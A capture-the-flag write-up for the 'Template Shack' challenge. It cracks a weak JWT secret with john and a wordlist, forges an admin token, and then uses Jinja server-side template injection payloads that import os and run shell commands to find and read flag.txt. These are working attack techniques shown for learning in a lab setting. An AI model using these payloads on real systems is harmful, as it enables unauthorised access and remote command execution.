## Write up Template Shack

On the website we got a session-token and token that seems to be a jwt:
to get the secret we have to bruteforce the jwt, using john:

``echo -n "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.9SvIFMTsXt2gYNRF9I0ZhRhLQViY-MN7VaUutz9NA9Y" > jwt.hash``
To crack it:
``john jwt.hash -w=/usr/share/wordlists/rockyou.txt``
we get the secret as ``supersecret``
![b4120f50ec01db439c6b1a0b2e17f8f3.png](_resources/c7897f309d1b41bca6694b0c50fe6bb6.png)

Decoding it:
![677ce90eb3b8a89b93597677284bfdb0.png](_resources/edef173f1f924dd4bf4b9be989e5d2b4.png)



No we have to create a new token and sign it using the jwt_tool:

![e569e3c4d816e07a1b772e43a10ec4dd.png](_resources/27c86bb8667e43888b85f2fe27a54223.png)

Using this tool we can change guest for admin and sign it with the key:

![67ab31baeab4bf5345583493879465ab.png](_resources/0d09dd7005ed411fa6e80dab4dec1292.png)

now we have a jwt token with "admin" ``eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.Ykqid4LTnSPZtoFb11H+/2q+Vo32g4mLpkEcajK0H7I``
changing the token with this value gives us access to de admin panel:

![1b97e21508f7ed17c791a153c436aacb.png](_resources/cf524efaf471459a914df674074bf974.png)

I noticed that inside the admin template when a webpage doesnt exists it renders de endpoint on the 404, for example if I look for /admin/abt.html I got:

![d26a25bb83b73a84cb913901c4a06eaa.png](_resources/ee4ef6fa2e3149428fcd900e2f90cb41.png)

This added to the name of the challenge made me think about template injection and bingo:

![0ada9bdc9cc0f7636be6951b93d8ee7f.png](_resources/bc7b222a05394a07b2d0e41d87e9f0f7.png)

So there is probably python running on the backgroung as this is a feature of flask jinja so lest find it out with ``{{ [].__class__.__base__.__subclasses__() }}``:

![1a41206868d5c17e10b3a8cf7044e622.png](_resources/f164d7016bf643edaba7377899c1188b.png)

So now we just need to use the os library to read the flag:
``{{ request.application.__globals__.__builtins__}}}`` we can access the builtins so we will try to import the os with ``{ request.application.__globals__.__builtins__.__import__('os')}}``

![9ea482a3850c3e64e933167c48b47b7f.png](_resources/d3ff18b2a9f648c9a3e9e75fb19e4543.png)

Its time to find the flag.txt ``{{ request.application.__globals__.__builtins__.__import__('os').popen('find / -name flag.txt').read()}}``

![c1c780927a45638edfbabb212872c8e8.png](_resources/d7e17b2be5c141bc8fcee36137c945e4.png)

and finally cat the flag ``{{ request.application.__globals__.__builtins__.__import__('os').popen('cat /home/user/flag.txt').read()}}``

![9c8b0fc698ca5267541f7672ddb4da4c.png](_resources/133eb074a30742abafd3d3486a1bd323.png)

And that was all!
